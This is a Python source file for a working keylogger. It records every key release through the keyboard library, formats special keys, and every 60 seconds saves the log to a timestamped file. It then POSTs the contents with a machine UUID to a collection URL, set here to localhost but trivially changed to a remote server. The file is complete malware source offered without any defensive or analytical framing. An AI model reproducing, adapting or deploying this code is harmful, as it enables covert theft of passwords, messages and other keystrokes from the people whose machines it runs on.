import keyboard
import requests
import uuid
from threading import Timer
from datetime import datetime

SEND_TIMER = 60
URL = 'http://localhost:3000/submit'

class Keylogger:
    def __init__(self, interval, url):
        self.interval = interval
        self.report_method = "file"
        self.log = ""
        self.uuid = uuid.uuid1()
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.url = url

    def callback(self, event):
        name = event.name
        if len(name) > 1:

            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name

    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
    
    def report_to_file(self):
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
            print(f"[+] Saved {self.filename}.txt")
    
    def send_request(self):
        with open(f"{self.filename}.txt", "r") as f:
            filedata = f.read()
            self.content = filedata.strip()

        reqdata = {'uuid': str(self.uuid), 'logs': str(self.content)} 

        r = requests.post(url=self.url, data=reqdata)
        print(r.text)

    def report(self):
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "file":
                self.report_to_file()
                self.send_request()
            # if you don't want to print in the console, comment below line
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
            
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_TIMER, url=URL)
    keylogger.start()

